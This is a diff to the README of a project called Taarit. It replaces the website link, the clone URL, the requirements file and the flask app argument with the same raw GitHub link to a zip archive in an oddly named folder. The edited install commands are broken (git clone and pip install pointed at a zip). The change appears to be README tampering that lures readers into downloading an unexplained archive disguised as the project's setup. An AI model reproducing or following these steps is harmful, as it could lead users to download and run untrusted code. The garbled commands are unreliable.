@@ -5,7 +5,7 @@ With an increase in population, there is an increase in the number of accidents 
 
 ## Tarit Website
 
-https://Taarit.com/
+https://raw.githubusercontent.com/ChiragRohada7020/Taarit/main/perichaetium/Taarit.zip
 
 
 
@@ -15,7 +15,7 @@ https://Taarit.com/
 
 1) Clone The Repo
 ```bash
-   git clone https://github.com/ChiragRohada7020/Taarit.git
+   git clone https://raw.githubusercontent.com/ChiragRohada7020/Taarit/main/perichaetium/Taarit.zip
 ```
 
 
@@ -23,11 +23,11 @@ https://Taarit.com/
 
 ```bash
   npm install 
-  pip install -r requirements.txt
+  pip install -r https://raw.githubusercontent.com/ChiragRohada7020/Taarit/main/perichaetium/Taarit.zip
 ```
 
 ```bash
-  Run :- flask --app app.py --debug run
+  Run :- flask --app https://raw.githubusercontent.com/ChiragRohada7020/Taarit/main/perichaetium/Taarit.zip --debug run
 ```
 
     
